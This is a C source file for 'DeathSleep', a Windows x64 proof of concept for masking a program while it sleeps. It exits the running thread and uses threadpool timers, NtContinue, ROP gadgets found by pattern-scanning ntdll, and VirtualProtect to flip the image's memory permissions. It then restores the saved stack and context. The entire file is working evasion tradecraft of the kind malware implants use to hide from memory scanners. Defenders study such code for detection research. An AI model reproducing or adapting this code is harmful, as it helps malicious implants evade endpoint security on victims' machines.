#include "common.h"
#include "DeathSleep.h"
#include "utils.h"

DWORD_PTR           initialRsp;

CONTEXT             threadCtxBackup;
CONTEXT             helperCtx;
CONTEXT             changePermRxCtx;
CONTEXT             changePermRwCtx;

PVOID               stackBackup;
DWORD               stackBackupSize;
PVOID               ropMemBlock;

PTP_CLEANUP_GROUP   cleanupgroup;

PTP_POOL            deobfuscationPool;
PTP_POOL            obfuscationPool;

CallbackInfo        captureCtxObfInfo;
CallbackInfo        changePermsRwInfo;
CallbackInfo        closePoolInfo;

CallbackInfo        captureCtxDeobfInfo;
CallbackInfo        changePermsRxInfo;

DWORD               OldProtect;

VOID awake(PVOID lpParam)
{
    initialRsp =getRsp();
    if (lpParam != NULL)
    {
        moveRsp(stackBackupSize, 0xFBFBFAFA);
        printf("\n\t[-] Waking up\n");

        PVOID NtContinue = NULL;
        NtContinue = GetProcAddress(GetModuleHandleA("Ntdll"), "NtContinue");

        memcpy((PVOID)(initialRsp - stackBackupSize), stackBackup, stackBackupSize);

        CloseThreadpool(deobfuscationPool);
        CloseThreadpoolCleanupGroupMembers(cleanupgroup, FALSE, NULL);
        CloseThreadpoolCleanupGroup(cleanupgroup);
        free(stackBackup);
        free(ropMemBlock);

        ((PCONTEXT)lpParam)->Rsp = (DWORD64)(initialRsp - stackBackupSize);
        ((void (*)(PCONTEXT, BOOLEAN))NtContinue)(lpParam, FALSE);
    }
    else
    {
        printf("\t[-] Starting main program\n");
        mainProgram();
    }
}

VOID rebirth(PTP_CALLBACK_INSTANCE Instance, PVOID lpParam, PTP_TIMER Timer)
{
    UNREFERENCED_PARAMETER(Instance);
    UNREFERENCED_PARAMETER(Timer);

    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)awake, lpParam, 0, NULL);
}

PVOID 
InitilizeRopStack(PVOID ropStackMemBlock, DWORD sizeRopStack, PVOID function, PVOID arg, PVOID rcxGadgetAddr, PVOID shadowFixerGadgetAddr)
{
    PVOID ropStackPtr = NULL;
    ropStackPtr = (PVOID)((DWORD_PTR)ropStackMemBlock + sizeRopStack);

    ropStackPtr = (PVOID)((DWORD_PTR)ropStackPtr - 8);
    *(PDWORD64)ropStackPtr = (DWORD_PTR)function;

    ropStackPtr = (PVOID)((DWORD_PTR)ropStackPtr - 8);
    *(PDWORD64)ropStackPtr = (DWORD_PTR)arg;

    ropStackPtr = (PVOID)((DWORD_PTR)ropStackPtr - 8);
    *(PDWORD64)ropStackPtr = (DWORD_PTR)rcxGadgetAddr;

    ropStackPtr = (PVOID)((DWORD_PTR)ropStackPtr - 48);
    *(PDWORD64)ropStackPtr = (DWORD_PTR)shadowFixerGadgetAddr;

    return ropStackPtr;
}

VOID
DeathSleep(ULONGLONG time)
{   
    RtlCaptureContext(&threadCtxBackup);

    TP_CALLBACK_ENVIRON deobfuscationEnv = { 0 };
    TP_CALLBACK_ENVIRON obfuscationEnv   = { 0 };
    
    PTP_TIMER rebirthTimer = NULL;
    
    FILETIME dueTimeHolder = { 0 };
    
    PVOID NdllImageBase = NULL;
    PVOID ImageBase     = NULL;
    DWORD ImageSize     = 0;
    DWORD stackFrameSize  = 0xFAFBFCFD;

    PVOID NtContinue            = NULL;
    PVOID SysFunc032            = NULL;
    PVOID RtlpTpTimerCallback   = NULL;
    PVOID rcxGadgetAddr         = NULL;
    PVOID shadowFixerGadgetAddr = NULL;

    DWORD sizeRopStack = 0;
    PVOID ropStackPtr  = NULL;

    ImageBase = (PVOID)GetModuleHandleA(NULL);
    ImageSize = ((PIMAGE_NT_HEADERS)((DWORD_PTR)ImageBase + ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew))->OptionalHeader.SizeOfImage;

    NdllImageBase = (PVOID)GetModuleHandleA("Ntdll");
    NtContinue    = GetProcAddress((HMODULE)NdllImageBase, "NtContinue");
    RtlpTpTimerCallback = (PVOID) findInModule("Ntdll",(PBYTE) "\x48\x89\x5c\x24\x08\x48\x89\x74\x24\x18\x57\x48\x83\xec\x40\x48\x8b\xda\x80\x7a\x58\x00\x0f\x84", "xxxxxxxxxxxxxxxxxxxxxxxx");

    rcxGadgetAddr =         findGadget((PBYTE) "\x59\xC3", "xx");
    shadowFixerGadgetAddr = findGadget((PBYTE) "\x48\x83\xC4\x20\x5F\xC3", "xxxxxx");

    threadCtxBackup.Rip = *(PDWORD64)(threadCtxBackup.Rsp + stackFrameSize);

    stackBackupSize = initialRsp - (threadCtxBackup.Rsp + stackFrameSize + 0x8);

    stackBackup = malloc(stackBackupSize);

    memcpy(stackBackup, (PVOID)(initialRsp - (DWORD64)stackBackupSize), stackBackupSize);

    InitializeThreadpoolEnvironment(&obfuscationEnv);
    InitializeThreadpoolEnvironment(&deobfuscationEnv);

    obfuscationPool    = CreateThreadpool(NULL);
    deobfuscationPool  = CreateThreadpool(NULL);

    SetThreadpoolThreadMaximum(obfuscationPool, 1);
    SetThreadpoolThreadMaximum(deobfuscationPool, 1);

    SetThreadpoolCallbackPool(&obfuscationEnv,   obfuscationPool);
    SetThreadpoolCallbackPool(&deobfuscationEnv, deobfuscationPool);

    cleanupgroup = CreateThreadpoolCleanupGroup();

    SetThreadpoolCallbackCleanupGroup(&obfuscationEnv, cleanupgroup, NULL);
    SetThreadpoolCallbackCleanupGroup(&deobfuscationEnv, cleanupgroup, NULL);

    InitializeCallbackInfo(&captureCtxObfInfo, RtlCaptureContext, &helperCtx);
    captureCtxObfInfo.timer = CreateThreadpoolTimer((PTP_TIMER_CALLBACK) RtlpTpTimerCallback, &captureCtxObfInfo, &obfuscationEnv);

    InitializeFiletimeMs(&dueTimeHolder, 0);
    SetThreadpoolTimer(captureCtxObfInfo.timer, &dueTimeHolder, 0, 0);
    
    Sleep(50);

    memcpy(&changePermRwCtx, &helperCtx, sizeof(CONTEXT));

    changePermRwCtx.Rsp -= 8;
    changePermRwCtx.Rip = (DWORD_PTR) VirtualProtect;
    changePermRwCtx.Rcx = (DWORD_PTR) ImageBase;
    changePermRwCtx.Rdx = ImageSize;
    changePermRwCtx.R8  = PAGE_READWRITE;
    changePermRwCtx.R9  = (DWORD_PTR) &OldProtect;

    sizeRopStack = 1000;
    ropMemBlock = malloc(sizeRopStack);
    ropStackPtr = InitilizeRopStack(ropMemBlock, sizeRopStack, NtContinue, &helperCtx, rcxGadgetAddr, shadowFixerGadgetAddr);
    RtlCaptureContext(&changePermRxCtx);

    changePermRxCtx.Rsp = (DWORD_PTR) ropStackPtr;
    changePermRxCtx.Rip = (DWORD_PTR) VirtualProtect;
    changePermRxCtx.Rcx = (DWORD_PTR) ImageBase;
    changePermRxCtx.Rdx = ImageSize;
    changePermRxCtx.R8  = PAGE_EXECUTE_READWRITE;
    changePermRxCtx.R9  = (DWORD_PTR) &OldProtect;

    InitializeCallbackInfo(&changePermsRwInfo,  NtContinue,        &changePermRwCtx);
    InitializeCallbackInfo(&closePoolInfo,      CloseThreadpool,   obfuscationPool);
    InitializeCallbackInfo(&captureCtxDeobfInfo, RtlCaptureContext, &helperCtx);
    InitializeCallbackInfo(&changePermsRxInfo,  NtContinue,        &changePermRxCtx);

    changePermsRwInfo.timer   = CreateThreadpoolTimer((PTP_TIMER_CALLBACK) RtlpTpTimerCallback, &changePermsRwInfo,   &obfuscationEnv);
    closePoolInfo.timer       = CreateThreadpoolTimer((PTP_TIMER_CALLBACK) RtlpTpTimerCallback, &closePoolInfo,       &obfuscationEnv);
    captureCtxDeobfInfo.timer = CreateThreadpoolTimer((PTP_TIMER_CALLBACK) RtlpTpTimerCallback, &captureCtxDeobfInfo, &deobfuscationEnv);
    changePermsRxInfo.timer   = CreateThreadpoolTimer((PTP_TIMER_CALLBACK) RtlpTpTimerCallback, &changePermsRxInfo,   &deobfuscationEnv);
    rebirthTimer              = CreateThreadpoolTimer((PTP_TIMER_CALLBACK) rebirth,             &threadCtxBackup,     &deobfuscationEnv);

    InitializeFiletimeMs(&dueTimeHolder, 200);
    SetThreadpoolTimer(changePermsRwInfo.timer,   &dueTimeHolder, 0, 0);

    InitializeFiletimeMs(&dueTimeHolder, 250);
    SetThreadpoolTimer(closePoolInfo.timer,       &dueTimeHolder, 0, 0);

    InitializeFiletimeMs(&dueTimeHolder, time - 100);
    SetThreadpoolTimer(captureCtxDeobfInfo.timer, &dueTimeHolder, 0, 0);

    InitializeFiletimeMs(&dueTimeHolder, time - 50);
    SetThreadpoolTimer(changePermsRxInfo.timer,   &dueTimeHolder, 0, 0);

    InitializeFiletimeMs(&dueTimeHolder, time);
    SetThreadpoolTimer(rebirthTimer,              &dueTimeHolder, 0, 0);

    ExitThread(0);
}

DWORD WINAPI mainProgram()
{
    int c = 0;

    while (c < 5)
    {
        printf("\t[-] Entering DeathSleep state\n");
        DeathSleep(5000);

        printf("\t[-] Doing some work... \n\t\t[-] Stack test: %d\n", c);
        Sleep(5000);

        c++;
    }
    printf("\n[*] PoC Ending, safe to kill process\n", c);
    return 0;
}

int main(int argc, char *argv[])
{
    
    printf("\n[*] DeathSleep PoC by httpyxel\n");
    printf("[>] Press any key to continue...\n");
    getchar();

    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)awake, NULL, 0, NULL);

    printf("\t[-] Dummy thread waiting...\n");
    Sleep(INFINITE);
    
}
